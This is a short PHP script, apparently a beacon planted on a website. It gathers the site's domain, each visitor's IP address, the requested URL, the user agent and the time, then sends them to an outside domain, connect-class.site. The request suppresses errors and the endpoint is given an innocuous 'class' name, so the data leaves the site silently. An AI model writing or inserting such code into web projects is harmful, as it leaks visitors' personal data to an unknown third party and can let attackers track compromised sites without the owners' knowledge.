<?php
$dados = [
    'dominio' => $_SERVER['HTTP_HOST'] ?? 'desconhecido',
    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'desconhecido',
    'url' => $_SERVER['REQUEST_URI'] ?? '',
    'agente' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'data' => date('Y-m-d H:i:s')
];
$classmain = 'https://connect-class.site/class.php';

@file_get_contents($classmain . '?' . http_build_query($dados));
?>
